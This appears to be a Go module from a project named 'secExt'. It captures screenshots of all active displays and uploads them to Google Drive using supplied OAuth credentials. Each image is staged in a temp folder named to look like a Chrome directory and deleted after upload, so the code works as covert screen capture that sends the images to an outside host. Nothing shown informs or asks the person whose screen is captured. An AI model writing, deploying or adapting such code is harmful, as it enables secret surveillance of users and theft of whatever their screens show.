package drive

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"image"
	"image/png"
	"os"
	"strings"
	"time"

	"github.com/fairytale5571/secExt/pkg/helpers"
	"github.com/fairytale5571/secExt/pkg/logger"
	"github.com/kbinani/screenshot"
	"golang.org/x/oauth2"
	"golang.org/x/oauth2/google"
	"google.golang.org/api/drive/v3"
)

type Drive struct {
	ctx         context.Context
	logger      *logger.Wrapper
	token       *oauth2.Token
	config      *oauth2.Config
	service     *drive.Service
	credentials []byte
}

func New() *Drive {
	return &Drive{
		logger: logger.New("drive"),
	}
}

func (d *Drive) checkPath(path string) string {
	srv := d.service

	folders := strings.Split(path, "/")[1:]
	root := true
	prevFile := ""

	for _, folder := range folders {
		req := srv.Files.List().Q(`mimeType="application/vnd.google-apps.folder"`).
			Q(fmt.Sprintf(`name="%s"`, folder))

		l, err := req.Fields("files(id, parents)").Do()
		if err != nil {
			continue
		}

		changedFile := false
		for _, file := range l.Files {
			if root {
				prevFile = file.Id
				changedFile = true
				root = false
				break
			} else if len(file.Parents) > 0 && file.Parents[0] == prevFile {
				prevFile = file.Id
				changedFile = true
				break
			}
		}

		if !changedFile {
			_file := &drive.File{
				MimeType: "application/vnd.google-apps.folder", Name: folder,
			}
			if prevFile != "" {
				_file.Parents = []string{prevFile}
			}

			newFile, err := srv.Files.Create(_file).
				Fields("id").Do()

			if err != nil {
				d.logger.Errorf("Unable to create folder in drive: %v", err)
				break
			} else {
				prevFile = newFile.Id
			}
		}
	}
	return prevFile
}

func (d *Drive) SetCredentials(creds string) (string, error) {
	d.credentials = []byte(creds)
	config, err := google.ConfigFromJSON(d.credentials, drive.DriveScope)
	if err != nil {
		d.logger.Errorf("Unable to parse client secret file to config: %v", err)
		return "", err
	}
	d.config = config
	return "Creds accepted", nil
}

func (d *Drive) SetToken(token string) (string, error) {
	tok := bytes.NewReader([]byte(token))
	if err := json.NewDecoder(tok).Decode(&d.token); err != nil {
		d.logger.Errorf("Unable to parse token file to config: %v", err)
		return "", err
	}
	return "Token accepted", nil
}

func (d *Drive) setupService() error {
	client := d.config.Client(context.Background(), d.token)
	srv, err := drive.New(client)
	if err != nil {
		d.logger.Errorf("Unable to retrieve Drive client: %v", err)
		return err
	}
	d.service = srv
	return nil
}

func (d *Drive) DumpScreen(path string) error {
	n := screenshot.NumActiveDisplays()
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			d.logger.Errorf("Unable to capture screen: %v", err)
			return err
		}
		t := time.Now()
		filename := fmt.Sprintf("%d-%02d-%02d_%02d-%02d-%02d.png", t.Year(), t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second())
		d.UploadFile(path, filename, img)
	}
	return nil
}

func (d *Drive) UploadFile(path, name string, img *image.RGBA) (string, error) {
	if err := d.setupService(); err != nil {
		d.logger.Errorf("Unable to setup service: %v", err)
		return "", err
	}
	pathFile := fmt.Sprintf("%s/chrome_drag0947_254420441/dir/", os.TempDir())

	if err := helpers.EnsureDir(pathFile); err != nil {
		d.logger.Errorf("Unable to create dir: %v", err)
		return "", err
	}

	filename := fmt.Sprintf("%s/%s", pathFile, name)
	file, err := os.Create(filename)
	if err != nil {
		d.logger.Errorf("Unable to create file: %v", err)
		return "", err
	}
	defer file.Close()
	defer os.Remove(filename)

	if err := png.Encode(file, img); err != nil {
		d.logger.Errorf("Unable to encode image: %v", err)
		return "", err
	}

	_img, err := os.ReadFile(filename)
	if err != nil {
		d.logger.Errorf("Unable to read file: %v", err)
		return "", err
	}
	dir := d.checkPath(path)
	if _, err := d.service.Files.Create(&drive.File{
		Name:    name,
		Parents: []string{dir},
	}).Media(bytes.NewReader(_img)).Do(); err != nil {
		d.logger.Errorf("Unable to upload file: %v", err)
		return "", err
	}

	return "", nil
}
